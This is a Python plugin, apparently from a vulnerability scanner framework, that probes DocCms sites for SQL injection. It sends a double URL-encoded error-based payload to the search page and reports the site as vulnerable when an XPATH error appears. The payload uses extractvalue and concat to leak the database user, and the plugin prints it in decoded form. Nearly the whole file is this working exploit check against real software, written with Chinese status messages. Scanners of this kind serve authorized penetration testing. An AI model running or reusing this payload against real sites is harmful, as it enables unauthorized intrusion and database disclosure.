#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile

urllib3.disable_warnings()


class DocSqlScan:

    def run(self, urls):
        try:
            url = urls + '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
            # print(head)
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if "XPATH" in response.text:
                OutPrintInfoSuc("DocCms", f'存在SQL注入 {url}')
                if not self.batch:
                    OutPrintInfo("DocCms", "[b bright_red]PAYLOAD为' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#的URL编码")

                else:
                    OutPutFile("doccms_sql.txt",f'存在SQL注入 {url}')
            else:
                if not self.batch:
                    OutPrintInfo("DocCms", '不存在SQL注入')
        except Exception:
            if not self.batch:
                OutPrintInfo("DocCms", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("DocCms", '开始检测SQL注入...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("DocCms", 'SQL注入检测结束')